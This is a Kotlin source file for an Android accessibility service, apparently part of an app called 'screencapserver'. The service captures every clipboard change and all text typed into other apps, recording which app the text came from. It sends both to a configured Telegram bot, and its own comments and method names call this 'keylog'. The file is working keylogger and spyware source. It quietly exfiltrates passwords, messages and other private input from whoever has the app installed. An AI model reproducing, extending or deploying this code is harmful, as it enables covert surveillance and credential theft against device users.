package com.dec.screencapserver

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.ClipboardManager
import android.util.Log
import android.view.accessibility.AccessibilityEvent

class ClipboardService : AccessibilityService() {

    private lateinit var clipMgr: ClipboardManager
    private lateinit var telegram: TelegramNotifier
    private var lastClip   = ""
    private var lastKeylog = ""
    private var lastKeyPkg = ""

    override fun onServiceConnected() {
        super.onServiceConnected()

        clipMgr  = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
        telegram = TelegramNotifier(Config.TELEGRAM_BOT_TOKEN, Config.TELEGRAM_CHAT_ID)

        // Clipboard change listener
        clipMgr.addPrimaryClipChangedListener {
            val text = clipMgr.primaryClip
                ?.getItemAt(0)
                ?.coerceToText(this)
                ?.toString()
                ?.trim()
                ?: return@addPrimaryClipChangedListener

            if (text.isNotEmpty() && text != lastClip) {
                lastClip = text
                telegram.sendClip(text)
                Log.d("Clipboard", "captured: ${text.take(50)}")
            }
        }

        // Configure accessibility events
        serviceInfo = serviceInfo?.also { info ->
            info.eventTypes =
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED or
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            info.feedbackType        = AccessibilityServiceInfo.FEEDBACK_GENERIC
            info.flags               = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                                       AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            info.notificationTimeout = 100
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        if (event.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return

        val typed = event.text.joinToString("").trim()
        val pkg   = event.packageName?.toString() ?: return

        // Skip our own app
        if (pkg == "com.dec.screencapserver") return

        // Debounce — only send when text changes meaningfully
        if (typed.length < 2) return
        if (typed == lastKeylog && pkg == lastKeyPkg) return

        lastKeylog = typed
        lastKeyPkg = pkg

        telegram.sendKeylog(pkg, typed)
    }

    override fun onInterrupt() {}
}
